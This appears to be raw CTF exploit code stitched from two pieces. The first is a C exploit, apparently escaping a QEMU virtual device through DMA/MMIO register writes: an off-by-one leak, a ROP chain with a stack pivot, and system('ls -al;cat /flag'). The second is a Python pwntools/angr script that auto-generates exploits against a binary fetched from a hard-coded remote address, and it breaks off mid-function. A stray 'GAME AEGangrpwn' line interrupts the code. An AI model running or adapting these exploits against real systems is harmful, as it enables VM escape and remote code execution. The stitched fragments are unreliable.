    uint8_t *dma_addr = (uint8_t *)mmap(0, 0x1000, PROT_READ | PROT_WRITE, 
MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    dma_addr[0] = 0;
    uint64_t phys = virt2phys(dma_addr);
    printf("phys = 0x%llx\n", phys);
    init_mmio();
    // leak lsb
    mmio_write(0x10, 0xfff);      // offset
    mmio_write(0x18, 2 | 1);      // count&1 1: mmio->hwaddr  0: hwaddr->mmio
    mmio_write(0x20, phys >> 12); // dmaddr
    mmio_write(0x60, 0); // dma
    uint8_t lsb = dma_addr[1];
    // set buffer
    mmio_write(0x10, 0x10);          // offset
    mmio_write(0x18, 0x18+0x10 | 0);     // count&1 1: mmio->hwaddr  0: 
hwaddr->mmio
    mmio_write(0x20, phys >> 12); // dmaddr
    *(uint64_t *)(dma_addr) = phys;            // dmaaddr
    *(uint16_t *)(dma_addr + 8) = 16 | 1;    // count
    *(uint16_t *)(dma_addr + 8 + 2) = 0xfe0; // offset
    mmio_write(0x60, 0); // dma
    // off by one
    mmio_write(0x10, 0xfff);      // offset
    mmio_write(0x18, 2 | 0);      // count&1 1: mmio->hwaddr  0: hwaddr->mmio
    mmio_write(0x20, phys >> 12); // dmaddr
    dma_addr[1] = lsb + 0x20;
    mmio_write(0x60, 0); // dma
    // leak
    mmio_write(0x60, 0); // dma
    //  self  0x20
    uint64_t self = *(uint64_t *)dma_addr;
    uint64_t cpu_physical_memory_rw = *(uint64_t *)(dma_addr + 8);
    printf("0x%llx 0x%llx\n", self, cpu_physical_memory_rw);
    uint64_t base = cpu_physical_memory_rw - 0x5BC5C0;
    // xor
    mmio_write(0x10, 0x18);      // offset
    mmio_write(0x18, 0x1c*2);      // count
    mmio_write(0x50, 0);
    // rop
    *(uint64_t *)(dma_addr+0x8-1) = 0;
    *(uint64_t *)(dma_addr+0x10-1) = 0xaabbccdd;
    *(uint64_t *)(dma_addr + 0x10-1 + 0xf) = base + 0x2cb3e0; // p3; ret
    // *(uint64_t *)(dma_addr+0x18-1) = 0xaabbccdd;
    // *(uint64_t *)(dma_addr+0x20-1) = 0xaabbccdd;
    *(uint64_t *)(dma_addr+0x28-1) = base + 0x2ad4a5; // pop rdi; ret;
GAME
AEGangrpwn
    *(uint64_t *)(dma_addr+0x30-1) = self + 0x1818; // cmd
    *(uint64_t *)(dma_addr+0x38-1) = base + 0x2A7A80; // system
    strcpy(dma_addr+0x40-1, "ls -al;cat /flag"); // cmd
    //*(uint64_t *)(dma_addr+0x1f8-1) = self; // self
    //  self 
    *(uint64_t *)(dma_addr+0x1f8-1) = self + 0xdf8; // self
    *(uint64_t *)(dma_addr+0x200-1) = base + 0x321956; //  push rsi; pop rsp; 
jmp qword ptr [rsi+0Fh]
    mmio_write(0x60, 0); // dma
    // system
    mmio_write(0x60, 0);
    return 0;
}
from pwn import *
import base64
import os
import angr
import re
import _thread as thr
import time
# import fuckpy3
import claripy
usleep = lambda x: time.sleep(x/1000000.0)
p = None
start_addr = None
find_addr = None
find_res = None
context.log_level = 'debug'
context.arch = 'amd64'
def find_csu(asms):
    r = '([0-9,a-f]+).+pop    rbx'
    return re.findall(r,asms)[0]
def find_csu_call(asms):
    r = '([0-9,a-f]+).+mov    rdx,r13'
    return re.findall(r,asms)[0]
def find_atoi(asms):
    r = '([0-9,a-f]+).+call.+atoi'
    return re.findall(r,asms)[0]
def find_read(asms):
    r = '([0-9,a-f]+).+call.+read'
    return re.findall(r,asms)[0]
def stack_deep(asms):
    r = 'lea    rax,\[rbp-([0-9,x,a-f]+)\]\n.+edx,([0-9,a-
z,x]+)\n.+\n.+\n.+read'
    return re.findall(r,asms)[0]
def load_prog():
    global p,start_addr,find_addr,find_res
    p = angr.Project('./out')
    print('prog loaded')
    while start_addr is None or find_addr is None:
        usleep(1)
    state = p.factory.blank_state(addr = start_addr)
    input_val = claripy.BVS('input',32)
    state.registers.store('eax',input_val)
    sim = p.factory.simulation_manager(state)
    sim.one_active.options.add(angr.options.LAZY_SOLVES)
    print(hex(find_addr),hex(start_addr+7),hex(start_addr))
    f = sim.explore(find=find_addr,avoid=start_addr+7)
    findo = f.found[0]
    res = findo.solver.eval(input_val)
    find_res = res
def build_csu(csu_gadget,csu_call,call_addr,arg1,arg2,arg3):
    res = p64(csu_gadget) + p64(0) + p64(1) + p64(call_addr) + p64(arg3) + 
p64(arg2) + p64(arg1)
    res += p64(csu_call) # + p64(0) * 7
    return res
rr = remote('121.36.21.113', 10004)
rr.recvuntil('info------------------\n')
data = rr.recvuntil('\nHi,',drop = True).strip()
f = open('out','wb')
f.write(base64.b64decode(data))
f.close()
def test_time(t):
    res = time.time()
    print('cost ' + str(res - t))
    return res
t = time.time()
thr.start_new_thread(load_prog,())
asms = os.popen('objdump -M intel -d ./out','r').read()
csu_gadget = int(find_csu(asms),16)
csu_call = int(find_csu_call(asms),16)
call_atoi_addr = int(find_atoi(asms),16)
start_addr = call_atoi_addr + 5
find_addr = int(find_read(asms),16)
read_para = stack_deep(asms)
print(read_para)
stack_deep = int(read_para[0],16)
read_num = int(read_para[1],16)
elf = ELF('./out')
print(stack_deep,read_num)
while find_res is None:
    usleep(1)
print(find_res)
t = test_time(t)
rr.recvuntil('code:')
rr.sendline(str(find_res))
# rr = process(['./out',str(find_res)])
def launch_gdb():